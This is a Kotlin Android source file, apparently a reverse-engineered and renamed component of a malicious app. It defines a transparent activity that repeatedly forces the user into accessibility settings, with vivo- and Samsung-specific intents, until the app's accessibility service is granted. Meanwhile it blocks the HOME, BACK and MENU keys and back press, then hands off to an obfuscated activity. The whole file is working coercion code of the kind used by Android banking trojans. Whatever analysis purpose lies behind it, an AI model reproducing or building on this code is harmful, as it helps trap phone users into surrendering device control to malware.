package com.storm.safe.rock.activity

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityManager
import com.storm.safe.rock.service.MyAccessibilityService
import java.util.Locale

/**
 * Transparent Activity that opens Accessibility Settings to enable our service,
 * then finishes once the service is enabled.
 *
 * Reverse-engineered from JADX: activity/AccessibilityTrampoline.java (205 lines).
 * Renamed: f51911a0→instance, a0→putFragmentArgs, a1→isServiceEnabled, a2→openAccessibilitySettings
 */
class AccessibilityTrampoline : Activity() {

    companion object {
        private const val TAG = "AccessibilityTrampoline"

        @Volatile
        @JvmStatic
        var instance: AccessibilityTrampoline? = null

        @JvmStatic
        fun isActivityOpen(): Boolean = instance != null

        /**
         * Attach fragment_args_key extras to the intent.
         */
        @JvmStatic
        fun putFragmentArgs(intent: Intent, targetComponent: String) {
            val bundle = Bundle()
            bundle.putString(":settings:fragment_args_key", targetComponent)
            intent.putExtra(":settings:fragment_args_key", targetComponent)
            intent.putExtra(":settings:show_fragment_args", bundle)
        }
    }

    /**
     * Check if our accessibility service is currently enabled.
     */
    fun isServiceEnabled(): Boolean {
        try {
            val am = getSystemService("accessibility") as? AccessibilityManager ?: return false
            val enabledServices = am.getEnabledAccessibilityServiceList(-1) ?: emptyList()
            if (enabledServices.isNotEmpty()) {
                for (info in enabledServices) {
                    val si = info.resolveInfo?.serviceInfo
                    if (si?.packageName == packageName) {
                        // Found our package in enabled list — but check component name too
                    }
                }
            }

            val settingValue = Settings.Secure.getString(contentResolver, "enabled_accessibility_services")
            if (settingValue != null) {
                val flatComponent = ComponentName(this, MyAccessibilityService::class.java).flattenToString()
                val parts = settingValue.split(':')
                for (part in parts) {
                    if (part == flatComponent) return true
                    if (part == "$packageName/${MyAccessibilityService::class.java.name}") return true
                }
            }
        } catch (_: Exception) {
        }
        return false
    }

    /**
     * Open the appropriate accessibility settings page based on device brand.
     */
    fun openAccessibilitySettings() {
        val name = MyAccessibilityService::class.java.name
        val targetComponent = "$packageName/$name"
        val brand = Build.BRAND?.lowercase(Locale.ROOT) ?: ""
        val manufacturer = Build.MANUFACTURER?.lowercase(Locale.ROOT) ?: ""

        // vivo-specific settings activities
        if (brand.contains("vivo", ignoreCase = true) || manufacturer.contains("vivo", ignoreCase = true)) {
            val vivoTargets = arrayOf(
                "com.vivo.settings" to "com.vivo.settings.accessibility.AccessibilitySettingsActivity",
                "com.android.settings" to "com.android.settings.accessibility.AccessibilitySettingsActivity",
                "com.vivo.settings" to "com.vivo.settings.VivoSubSettingsForImmersive"
            )
            for ((pkg, cls) in vivoTargets) {
                try {
                    val intent = Intent()
                    intent.setClassName(pkg, cls)
                    intent.flags = 1350565888 // FLAG_ACTIVITY_NEW_TASK | others
                    putFragmentArgs(intent, targetComponent)
                    startActivity(intent)
                    return
                } catch (e: Exception) {
                    e.message // swallowed
                }
            }
        }

        // Samsung-specific
        if (brand.contains("samsung", ignoreCase = true) || manufacturer.contains("samsung", ignoreCase = true)) {
            try {
                val intent = Intent("com.samsung.accessibility.installed_service")
                intent.flags = 1350565888
                putFragmentArgs(intent, targetComponent)
                startActivity(intent)
                return
            } catch (e: Exception) {
                e.message
            }
        }

        // Generic accessibility settings
        try {
            val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
            intent.flags = 1350565888
            putFragmentArgs(intent, targetComponent)
            startActivity(intent)
        } catch (e: Exception) {
            e.message
            try {
                val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
                intent.flags = 1350565888
                startActivity(intent)
            } catch (e2: Exception) {
                e2.message
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        if (isServiceEnabled()) {
            finish()
        } else {
            openAccessibilitySettings()
        }
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        // Block HOME(3), BACK(4), MENU(82) keys
        return keyCode == 3 || keyCode == 4 || keyCode == 82
    }

    override fun onResume() {
        super.onResume()
        if (!isServiceEnabled()) {
            openAccessibilitySettings()
            return
        }
        try {
            val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java)
            intent.addFlags(335544320) // FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP
            startActivity(intent)
        } catch (_: Exception) {
        }
        finish()
    }

    override fun onBackPressed() {
        // Block back press
    }
}
